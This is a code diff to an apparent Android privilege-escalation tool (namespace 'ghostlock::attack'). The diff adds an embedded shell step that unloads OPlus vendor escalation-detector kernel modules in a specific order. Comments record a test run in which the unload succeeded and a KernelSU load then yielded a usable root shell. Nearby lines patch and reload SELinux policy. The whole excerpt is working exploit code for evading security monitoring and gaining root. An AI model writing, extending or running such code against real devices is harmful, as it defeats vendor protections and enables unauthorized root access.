@@ -522,6 +522,27 @@ namespace ghostlock::attack {
             "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
             "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
             "fi\n"
+            /* OPlus only: the vendor's escalation detector is a loadable module
+             * with a zero refcount, so delete_module unregisters its sys_exit
+             * tracepoint outright -- no write primitive, no setuid. Measured
+             * 2026-11-15 on 5.10.226: `GUARD-UNLOAD rc1=0 rc2=0 before=2
+             * after=0`, and the same run's KernelSU late-load then produced a
+             * usable su. oplus_secure_harden's single reference is held by
+             * oplus_security_guard, so the order is load-bearing (the reverse
+             * is EBUSY). Guarded on the entries being present, so every other
+             * vendor skips it; nothing here is fatal, and the modules come
+             * back at the next boot because the vendor reloads them. */
+            "if grep -qE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null; then\n"
+            "  gu_md=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)\n"
+            "  gu_before=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
+            "  gu_rmmod=$(command -v rmmod 2>/dev/null)\n"
+            "  [ -n \"$gu_rmmod\" ] || gu_rmmod=/system/bin/rmmod\n"
+            "  \"$gu_rmmod\" oplus_security_guard 2>>\"$LOG\"; gu_rc1=$?\n"
+            "  \"$gu_rmmod\" oplus_secure_harden 2>>\"$LOG\"; gu_rc2=$?\n"
+            "  gu_after=$(grep -cE '^oplus_(security_guard|secure_harden)[[:space:]]' /proc/modules 2>/dev/null)\n"
+            "  echo \"GUARD-UNLOAD md=${gu_md:-unreadable} before=$gu_before rc1=$gu_rc1 rc2=$gu_rc2 after=$gu_after\"\n"
+            "  echo \"[*] guard unload md=${gu_md:-unreadable} before=$gu_before rc1=$gu_rc1 rc2=$gu_rc2 after=$gu_after\" >>\"$LOG\"\n"
+            "fi\n"
             "# step 1: restore policy\n"
             /* The dump is a *working copy* -- patched in place, then handed to
              * load_policy -- never evidence, and nothing reads it afterwards.
